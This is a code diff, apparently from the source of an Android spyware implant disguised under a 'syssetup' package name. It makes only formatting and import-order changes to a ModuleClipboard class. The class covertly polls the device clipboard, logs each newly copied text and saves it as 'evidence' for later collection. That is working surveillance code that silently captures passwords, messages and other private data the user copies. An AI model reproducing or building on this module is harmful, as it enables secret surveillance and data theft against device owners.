@@ -9,8 +9,6 @@
 
 package com.android.syssetup.module;
 
-import java.util.ArrayList;
-
 import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
@@ -27,13 +25,14 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DateTime;
 import com.android.syssetup.util.WChar;
 
+import java.util.ArrayList;
+
 
 public class ModuleClipboard extends BaseModule implements IncrementalLog {
 
 	private static final String TAG = "ModuleClipboard"; //$NON-NLS-1$
-
-	ClipboardManager clipboardManager;
 	static String lastClip = ""; //$NON-NLS-1$
+	ClipboardManager clipboardManager;
 
 	@Override
 	public void actualStart() {
@@ -66,35 +65,35 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 			}
 		});
 	}
-	
+
 	private void getClipboard() {
 		String ret = null;
-		
+
 		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
-		
+
 		if (Cfg.DEBUG) {
 			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
 		}
-		
+
 		if (clipboardManager == null) {
 			return;
 		}
-		
+
 		CharSequence cs = clipboardManager.getText();
-		
+
 		if (cs == null)
 			return;
-		
+
 		ret = cs.toString();
-		
+
 		if (ret != null && !ret.equals(lastClip)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): captured " + ret);//$NON-NLS-1$
 			}
-			
+
 			// Questo log non e' piu incrementale
 			saveEvidence(ret);
-			
+
 			lastClip = ret;
 		}
 	}
@@ -105,13 +104,13 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
 		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
-		
+
 		EvidenceBuilder evidence;
-		
+
 		synchronized (this) {
 			evidence = new EvidenceBuilder(EvidenceType.CLIPBOARD);
 		}
-		
+
 		items.add(tm);
 		items.add(process);
 		items.add(window);
@@ -121,7 +120,7 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		if (Cfg.DEBUG) {
 			Check.asserts(evidence != null, "null log"); //$NON-NLS-1$
 		}
-		
+
 		synchronized (this) {
 			evidence.write(items);
 			evidence.close();
